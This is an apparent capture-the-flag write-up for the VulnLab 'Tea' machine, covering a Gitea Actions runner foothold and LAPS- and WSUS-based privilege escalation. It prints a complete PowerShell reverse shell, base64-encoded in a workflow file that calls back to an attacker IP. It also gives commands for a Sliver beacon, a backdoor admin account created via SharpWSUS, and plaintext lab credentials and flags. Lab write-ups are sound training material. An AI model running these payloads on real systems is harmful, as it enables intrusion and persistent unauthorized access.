# Tea VulnLab

IP: 10.10.184.165 | 10.10.184.166

On the initial scan, we find port 3389 and 3000 opened on the second box.

For basic Web enumeration, we see the box is running gittea version `Version: 1.21.2`
Checking the internet for known exploits but we could not find any.


We find API under `$IP:3000/api/swagger#/`
There doesn't seem to be much information when we enumerate the application. 

We create an account:

```
Test
password: testtest
email: test@test.com

```

Once we log in we see some information about the Admin user `email for admin - gitea@tea.vl`

After further enumeration, we find Runners with a label called `windows-latest`

Following the quick guide `https://docs.gitea.com/usage/actions/quickstart` we can run commands on the Windows machine and get a call back.

The example used in the quickstart guide shows how to run commands on an Ubuntu box.

On the box, we need to create a new repository and enable actions

```
Use Actions
Even if Actions is enabled for the Gitea instance, repositories still disable Actions by default.

To enable it, go to the settings page of your repository like your_gitea.com/<owner>/repo/settings, and enable Enable Repository Actions.

```
once we create a new repository we need to add a new file into `.gitea/workflows/filename.yaml`


`.gitea/workflows/build.yaml`

We need to create a base64 PowerShell reverse shell.

one way is to use CyberChef `gchq.github.io` in the recipe and add `Encode Text` and `To Base64`

or you can convert to base64 using `iconv -f ASCII -t UTF-16LE powershell-rev.txt | base64 | tr -d "\n"`

Powershell Reverse Shell Change $IP and $PORT.
```
|>$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()<|

```

replace $IP & $PORT with your IP and preferred port, I used 443


```yaml
name: Build
run-name: ${{ github.actor }} runner build job
on: [push]
jobs:
    Shell:
        runs-on: windows-latest
        steps:
        - name: shell
            run: powershell -enc  
            |> JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AOAAuADAALgAyADIAOQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAIgAuACAAewAgACQAZABhAHQAYQAgAH0AIAAyAD4AJgAxACIAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= <|
```

Before you commit you need to start up a listener.
`pwncat-cs -m windows -p443` or `nc -lvnp 443`

Once Gitea runs the command you should get a reverseshell on the Windows Machine.

# Enumeration

You need to do some simple enumeration and watch out for hidden folders.

Look for read and write permissions.

`whoami` = `tea\thomas.wallace`

view hidden files/folders in the Windows directory
`cmd /c dir /A`

`whoami /all`

you should find a flag in the current users' directory `C:\Users\thomas.wallace\Desktop` && `more flag.txt`
you should find a directory called install `cd c:/_install`

```
PS C:\_install> ls


    Directory: C:\_install


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/24/2023   5:37 AM        1118208 LAPS.x64.msi                                                         
-a----        12/24/2023   5:37 AM         641378 LAPS_OperationsGuide.docx                                            
-a----        10/22/2023   6:03 AM         833472 PsExec64.exe                                                         
-a----        12/24/2023   5:38 AM         535984 PsInfo64.exe 

```
We can run tools like Bloodhound and PowerView to look for misconfiguration and Path to Domain Admin.
Get Updog to get upload/download to Kali.

I generate a beacon using silver `generate beacon --seconds 4 --jitter 3 --os windows --arch amd64 --format EXECUTABLE --http 10.8.0.229:8443 --name tea2 --save beacon.exe -G --skip-symbols`

started a server using python `python3 -m http.server 8000`


sliver command for bloodhound `sharp-hound-4 -i -s -t 120 -- -c all,gpolocalgroup`

From the Bloodhound Enumeration, you will find that the current user can read Laps in Clear


# Privilege Escalation

```
PS C:\_install> .\beacon.exe
PS C:\_install> Get-LapsADPassword -Identity srv 


ComputerName        : SRV
DistinguishedName   : CN=SRV,OU=Servers,DC=tea,DC=vl
Account             : Administrator
Password            : System.Security.SecureString
PasswordUpdateTime  : 12/24/2023 5:57:53 AM
ExpirationTimestamp : 1/23/2024 5:57:53 AM
Source              : EncryptedPassword
DecryptionStatus    : Success
AuthorizedDecryptor : TEA\Server Administration



PS C:\_install> Get-LapsADPassword -Identity srv -AsPlainText


ComputerName        : SRV
DistinguishedName   : CN=SRV,OU=Servers,DC=tea,DC=vl
Account             : Administrator
Password            : NC4X9Yl+;$M
PasswordUpdateTime  : 12/24/2023 5:57:53 AM
ExpirationTimestamp : 1/23/2024 5:57:53 AM
Source              : EncryptedPassword
DecryptionStatus    : Success
AuthorizedDecryptor : TEA\Server Administration

```

`Administrator password : NC4X9Yl+;$M`
You can login using xfreerdp. `xfreerdp /u:obz /p:'Qwerty123' /dynamic-resolution /v:10.10.189.197`


the _install folder has PSExec64 which can be used for Privilege Escalation. using SharpWSUS we can push out updates to computers and approve. 
`https://github.com/techspence/SharpWSUS`


Open Command Prompt as Administrator using the credentials you got. 

```
c:\_install\SharpWSUS.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user obz Qwerty123 /add && net localgroup administrators obz /add\""

or

c:\_install\sharpwsus.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user obz Qwerty123 /add && net localgroup administrators obz /add\\""

```

-------

You should retry this command below several times until the user is part of the admin group.
```
SharpWSUS.exe approve /updateid:363a6caa-7624-459d-b912-0740166f92b1 /computername:dc.tea.vl /groupname:"Custome01"

```
You can log in using the new user you have added to the admin group.
`xfreerdp /u:obz /p:'Qwerty123' /dynamic-resolution /v:10.10.189.197` or use nxc/crackmapexec

# Flags

thomas.wallace `VL{4e1989d1fe9a7cfc33}`
Admin `VL{0625916903cc1c8661}`
root `VL{9bb75d5911b1a1f939}`
